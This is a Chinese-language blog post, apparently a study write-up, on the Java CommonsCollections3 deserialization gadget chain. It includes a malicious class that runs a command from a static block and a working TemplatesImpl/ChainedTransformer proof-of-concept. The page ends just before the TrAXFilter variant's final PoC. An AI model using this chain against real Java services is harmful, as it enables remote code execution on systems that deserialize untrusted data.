@@ -1,0 +1,769 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Mechoy">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="CommonsCollections30x00 前言CC1、CC6都是最终走到Runtime.getRuntime().exec()，也就是命令执行，这次来看一个不一样，已经学过了类加载，那就来看一下动态类加载 环境 jdk8u65 CommonsCollections3.2.1  0x01 危险方法在类加载部分，已知了最终实现类加载的是ClassLoader#defineClass()，当然这里">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CommonsCollections3">
+<meta property="og:url" content="http://example.com/2022/10/08/CommonsCollections3/index.html">
+<meta property="og:site_name" content="Mechoy&#39;s Blog">
+<meta property="og:description" content="CommonsCollections30x00 前言CC1、CC6都是最终走到Runtime.getRuntime().exec()，也就是命令执行，这次来看一个不一样，已经学过了类加载，那就来看一下动态类加载 环境 jdk8u65 CommonsCollections3.2.1  0x01 危险方法在类加载部分，已知了最终实现类加载的是ClassLoader#defineClass()，当然这里">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2022/10/08/CommonsCollections3/1.png">
+<meta property="og:image" content="http://example.com/2022/10/08/CommonsCollections3/2.png">
+<meta property="og:image" content="http://example.com/2022/10/08/CommonsCollections3/3.png">
+<meta property="og:image" content="http://example.com/2022/10/08/CommonsCollections3/4.png">
+<meta property="og:image" content="http://example.com/2022/10/08/CommonsCollections3/5.png">
+<meta property="og:image" content="http://example.com/2022/10/08/CommonsCollections3/6.png">
+<meta property="og:image" content="http://example.com/2022/10/08/CommonsCollections3/7.png">
+<meta property="og:image" content="http://example.com/2022/10/08/CommonsCollections3/8.png">
+<meta property="og:image" content="http://example.com/2022/10/08/CommonsCollections3/9.png">
+<meta property="og:image" content="http://example.com/2022/10/08/CommonsCollections3/10.png">
+<meta property="og:image" content="http://example.com/2022/10/08/CommonsCollections3/11.png">
+<meta property="og:image" content="http://example.com/2022/10/08/CommonsCollections3/13.png">
+<meta property="og:image" content="http://example.com/2022/10/08/CommonsCollections3/14.png">
+<meta property="og:image" content="http://example.com/2022/10/08/CommonsCollections3/12.png">
+<meta property="article:published_time" content="2022-10-07T16:44:22.000Z">
+<meta property="article:modified_time" content="2023-04-02T16:58:42.660Z">
+<meta property="article:author" content="Mechoy">
+<meta property="article:tag" content="Java安全">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2022/10/08/CommonsCollections3/1.png">
+  
+  
+  <title>CommonsCollections3 - Mechoy&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.14","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+
+  
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Mechoy&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="CommonsCollections3"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        Mechoy
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-10-08 00:44" pubdate>
+          2022年10月8日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          10k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          50 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">CommonsCollections3</h1>
+            
+            <div class="markdown-body">
+              
+              <h2 id="CommonsCollections3"><a href="#CommonsCollections3" class="headerlink" title="CommonsCollections3"></a>CommonsCollections3</h2><h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>CC1、CC6都是最终走到<code>Runtime.getRuntime().exec()</code>，也就是命令执行，这次来看一个不一样，已经学过了类加载，那就来看一下动态类加载</p>
+<h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><ul>
+<li>jdk8u65</li>
+<li>CommonsCollections3.2.1</li>
+</ul>
+<h3 id="0x01-危险方法"><a href="#0x01-危险方法" class="headerlink" title="0x01 危险方法"></a>0x01 危险方法</h3><p>在类加载部分，已知了最终实现类加载的是<code>ClassLoader#defineClass()</code>，当然这里需要进行初始化<code>newInstance</code>,初始化的时候才能够执行静态代码，然后开找，找的时候注意以下几点：</p>
+<ul>
+<li>尽量JDK自带</li>
+<li>尽量Public</li>
+<li>尽量非同名函数，且函数名称较为普遍</li>
+</ul>
+<p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.TransletClassLoader#defineClass</code></p>
+<p><img src="/2022/10/08/CommonsCollections3/1.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#defineTransletClasses</code></p>
+<p><img src="/2022/10/08/CommonsCollections3/2.png" srcset="/img/loading.gif" lazyload></p>
+<p>这里需要注意的是，已知<code>ClassLoader.defineClass()</code>并不会初始化类，所以还需要找一下带有<code>newInstance</code>的地方</p>
+<p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getTransletInstance</code>，三个结果中，唯有这个带有<code>newInstance</code>，所以只能选他</p>
+<p><img src="/2022/10/08/CommonsCollections3/3.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#newTransformer</code></p>
+<p>找到一个public修饰的方法</p>
+<p><img src="/2022/10/08/CommonsCollections3/4.png" srcset="/img/loading.gif" lazyload></p>
+<p>再来看一下这个类<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code></p>
+<p>public修饰，并且实现了Serializable接口，接下来只需要实现该类，并且成功走到我们想要的<code>defineClass</code>就可以了</p>
+<p><img src="/2022/10/08/CommonsCollections3/5.png" srcset="/img/loading.gif" lazyload></p>
+<p>大概的流程就是下面的这个样子</p>
+<p><img src="/2022/10/08/CommonsCollections3/6.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="0x02-TemplatesImpl"><a href="#0x02-TemplatesImpl" class="headerlink" title="0x02 TemplatesImpl"></a>0x02 TemplatesImpl</h3><p>一种三个构造器，两个受保护的，那肯定选public的</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">TemplatesImpl</span><span class="hljs-params">()</span> </span>&#123; &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-title">TemplatesImpl</span><span class="hljs-params">(<span class="hljs-keyword">byte</span>[][] bytecodes, String transletName,</span></span><br><span class="hljs-params"><span class="hljs-function">                        Properties outputProperties, <span class="hljs-keyword">int</span> indentNumber,</span></span><br><span class="hljs-params"><span class="hljs-function">                        TransformerFactoryImpl tfactory)</span></span><br><span class="hljs-function"></span>&#123;<br>    _bytecodes = bytecodes;<br>    init(transletName, outputProperties, indentNumber, tfactory);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-title">TemplatesImpl</span><span class="hljs-params">(Class[] transletClasses, String transletName,</span></span><br><span class="hljs-params"><span class="hljs-function">                        Properties outputProperties, <span class="hljs-keyword">int</span> indentNumber,</span></span><br><span class="hljs-params"><span class="hljs-function">                        TransformerFactoryImpl tfactory)</span></span><br><span class="hljs-function"></span>&#123;<br>    _class     = transletClasses;<br>    _transletIndex = <span class="hljs-number">0</span>;<br>    init(transletName, outputProperties, indentNumber, tfactory);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>但在整个流程中，能够发现该类的一些属性都是需要有一定的值，所以先来看一下该类和其中的一些属性；</p>
+<p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code> 是一个 Java 类，它是 XSLT 编译器的一个实现，用于将 XSLT 文件编译成可执行的模板。该类是由 Apache Xalan 和 Sun 公司共同开发的，它实现了 <code>javax.xml.transform.Templates</code> 接口。</p>
+<ul>
+<li><p><code>_bytecodes</code>：存储该模板的编译后字节码的字节数组。在这里其实就是危险类的class文件的字节数组</p>
+</li>
+<li><p><code>_name</code>：表示该模板的名称。</p>
+</li>
+<li><p><code>_outputProperties</code>：包含该模板的输出属性的 <code>Properties</code> 对象。</p>
+</li>
+<li><p><code>_indentNumber</code>：表示该模板的输出缩进量。</p>
+</li>
+<li><p><code>_transletIndex</code>：表示该模板在所有编译后的模板中的索引位置。</p>
+</li>
+<li><p><code>_transletVersion</code>：表示该模板的转换版本。</p>
+</li>
+<li><p><code>_hasIdCall</code>：指示该模板是否包含 ID 调用。</p>
+</li>
+<li><p><code>_auxClasses</code>：表示该模板所需的辅助类的数组。</p>
+</li>
+<li><p><code>_class</code>：表示该模板的类对象。</p>
+</li>
+<li><p><code>_uriResolver</code>：用于解析 URI 的 <code>URIResolver</code> 对象。</p>
+</li>
+<li><p><code>_tfactory</code>：用于创建 <code>TransformerHandler</code> 实例的 <code>TransformerFactoryImpl</code> 对象。该属性被<code>transient</code>修饰，表示不可序列化，但它在readObject()中进行了赋值，所以几乎没有影响，只不过在测试时需要进行赋值</p>
+<p><img src="/2022/10/08/CommonsCollections3/7.png" srcset="/img/loading.gif" lazyload></p>
+</li>
+</ul>
+<h3 id="0x03-调试"><a href="#0x03-调试" class="headerlink" title="0x03 调试"></a>0x03 调试</h3><p>先给一些能够看见的值进行赋值，例如<code>_bytecodes</code>、<code>_name</code>、<code>_tfactory</code>，使用反射进行赋值，因为这些变量都是非public的</p>
+<p><img src="/2022/10/08/CommonsCollections3/8.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2022/10/08/CommonsCollections3/9.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String ABSTRACT_TRANSLET<br>    = <span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>;<br></code></pre></td></tr></table></figure>
+
+<p>所以，此时应该改一改危险类，编译一下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Cattle</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">com</span>.<span class="hljs-title">sun</span>.<span class="hljs-title">org</span>.<span class="hljs-title">apache</span>.<span class="hljs-title">xalan</span>.<span class="hljs-title">internal</span>.<span class="hljs-title">xsltc</span>.<span class="hljs-title">runtime</span>.<span class="hljs-title">AbstractTranslet</span></span>&#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException </span>&#123;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException </span>&#123;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/10/08/CommonsCollections3/10.png" srcset="/img/loading.gif" lazyload></p>
+<p>这个点就可以了</p>
+<h3 id="0x04-POC"><a href="#0x04-POC" class="headerlink" title="0x04 POC"></a>0x04 POC</h3><p>执行的代码部分已经完工了，接下来只需要在使用InvokerTransformer去调用那个方法就可以了，可以直接拼接CC1的部分</p>
+<p>此处使用jdk8u65</p>
+<p>但需要注意的是，要改一下<code>ChainedTransformer</code></p>
+<p>最终POC如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC3Test</span> </span>&#123;<br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">static</span> String path = <span class="hljs-string">&quot;ser.bin&quot;</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        TemplatesImpl templates = <span class="hljs-keyword">new</span> TemplatesImpl();<br>        Class&lt;TemplatesImpl&gt; templatesClass = TemplatesImpl.class;<br>        Field name = templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        name.setAccessible(<span class="hljs-keyword">true</span>);<br>        name.set(templates,<span class="hljs-string">&quot;zzz&quot;</span>);<br><br>        Field bytecodes = templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-keyword">true</span>);<br>        <span class="hljs-keyword">byte</span>[][] b = &#123;classBytes()&#125;;<br>        bytecodes.set(templates,b);<br><br>        Field tfactory = templatesClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactory.setAccessible(<span class="hljs-keyword">true</span>);<br>        tfactory.set(templates, <span class="hljs-keyword">new</span> TransformerFactoryImpl());<br><br><span class="hljs-comment">//        Transformer transformer = templates.newTransformer();</span><br><br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(templates),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;newTransformer&quot;</span>,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>)<br>        &#125;);<br><br>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>        hashMap.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;kkk&quot;</span>);<br>        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="hljs-keyword">null</span>, (Transformer) chainedTransformer);<br><br>        Class&lt;?&gt; aih = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; declaredConstructor = aih.getDeclaredConstructor(Class.class,Map.class);<br>        declaredConstructor.setAccessible(<span class="hljs-keyword">true</span>);<br>        Object o = declaredConstructor.newInstance(Target.class, transformedMap);<br><span class="hljs-comment">//        serialize(o);</span><br><span class="hljs-comment">//</span><br>        deserialize();<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        FileOutputStream fos = <span class="hljs-keyword">new</span> FileOutputStream(path);<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(fos);<br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title">deserialize</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>&#123;<br>        FileInputStream fis = <span class="hljs-keyword">new</span> FileInputStream(path);<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(fis);<br>        Object o = ois.readObject();<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">byte</span>[] classBytes() <span class="hljs-keyword">throws</span> IOException &#123;<br>        FileInputStream fis = <span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;C:\\Users\\53433\\Desktop\\class\\Cattle.class&quot;</span>);<br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        <span class="hljs-keyword">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">1024</span>];<br>        <span class="hljs-keyword">int</span> len;<br>        <span class="hljs-keyword">while</span> ((len = fis.read(buffer)) != -<span class="hljs-number">1</span>) &#123;<br>            baos.write(buffer, <span class="hljs-number">0</span>, len);<br>        &#125;<br>        <span class="hljs-keyword">byte</span>[] classBytes = baos.toByteArray();<br>        <span class="hljs-keyword">return</span> classBytes;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/10/08/CommonsCollections3/11.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="0x05-官方POC"><a href="#0x05-官方POC" class="headerlink" title="0x05 官方POC"></a>0x05 官方POC</h3><p>emmmm，弄完之后，一看官方POC，他喵的，不一样，有一个点没有用到，敲了，还是没有官方的路子宽啊，路又走窄了</p>
+<p>官方说，这里是CC1的一个变体 使用<code>InstantiateTransformer</code>来替换了<code>InvokerTransformer</code></p>
+<p>在<code>InvokerTransformer</code>被禁用后，也就是上面调用<code>newTransformer</code>的地方不能走了，需要寻找一个新的调用<code>newTransformer</code>的地方</p>
+<p>找一下（其实是看下大佬的），来到<code>com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</code></p>
+<h4 id="TrAXFilter"><a href="#TrAXFilter" class="headerlink" title="TrAXFilter"></a>TrAXFilter</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TrAXFilter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">XMLFilterImpl</span> </span>&#123;<br>	<span class="hljs-keyword">private</span> Templates              _templates;<br>	....<br>    <br>    <span class="hljs-comment">// 构造器，templates可控</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">TrAXFilter</span><span class="hljs-params">(Templates templates)</span>  <span class="hljs-keyword">throws</span> TransformerConfigurationException</span>&#123;<br>        _templates = templates;<br>        _transformer = (TransformerImpl) templates.newTransformer();	<span class="hljs-comment">// 调用newTransformer()</span><br>        _transformerHandler = <span class="hljs-keyword">new</span> TransformerHandlerImpl(_transformer);<br>        _useServicesMechanism = _transformer.useServicesMechnism();<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>但有个问题就是，该类并没有实现Serializable接口，但该类的Class可以被序列化（只需一番操作即可）</p>
+<h4 id="InstantiateTransformer"><a href="#InstantiateTransformer" class="headerlink" title="InstantiateTransformer"></a>InstantiateTransformer</h4><p>来到这条链的重点</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">InstantiateTransformer</span>&lt;<span class="hljs-title">T</span>&gt; <span class="hljs-keyword">implements</span> <span class="hljs-title">Transformer</span>&lt;<span class="hljs-title">Class</span>&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title">T</span>&gt;, <span class="hljs-title">T</span>&gt;, <span class="hljs-title">Serializable</span> </span>&#123;<br>    <br>    <br>    <span class="hljs-comment">// 获取input(类.class)的构造器，根据参数类型，需要是public，然后实例化，input是一个Class类型</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> T <span class="hljs-title">transform</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;? extends T&gt; input)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span> (input == <span class="hljs-keyword">null</span>) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> FunctorException(...);<br>            &#125;<br>            <span class="hljs-keyword">final</span> Constructor&lt;? extends T&gt; con = input.getConstructor(iParamTypes);<br>            <span class="hljs-keyword">return</span> con.newInstance(iArgs);	<span class="hljs-comment">// 传入参数，执行构造器</span><br>        ...<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>首先该类实现了<code>Serializable</code>接口，然后该类的<code>transform</code>中根据<code>input</code>和<code>iParamTypes</code>获取输入的构造器，并进行实例化（且这两个参数都可控）因此如果有一个恶意类中的构造器、代码块、静态代码块中存在可以利用的地方（也就是上面的<code>TrAXFilter</code>）简单实现以下</p>
+<h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><p>到这里，可以先简单测试一下，也是可以的</p>
+<p><img src="/2022/10/08/CommonsCollections3/13.png" srcset="/img/loading.gif" lazyload></p>
+<p>剩下的事情，就是拼接了，需要注意的是，这里仍然需要使用<code>ChainedTransformer</code>，为什么呢</p>
+<p>因为<code>InstantiateTransformer</code>在调用tansformer的时候，仍然需要一个参数值，也就是<code>TrAXFilter.class</code>,如果直接在反序列化的时候调用<code>InstantiateTransformer</code>，将TiedMapEntry中的key作为input传入</p>
+<p><img src="/2022/10/08/CommonsCollections3/14.png" srcset="/img/loading.gif" lazyload></p>
+<p>所以这里还是需要借用一下<code>ChainedTransformer</code>，最终poc如下</p>
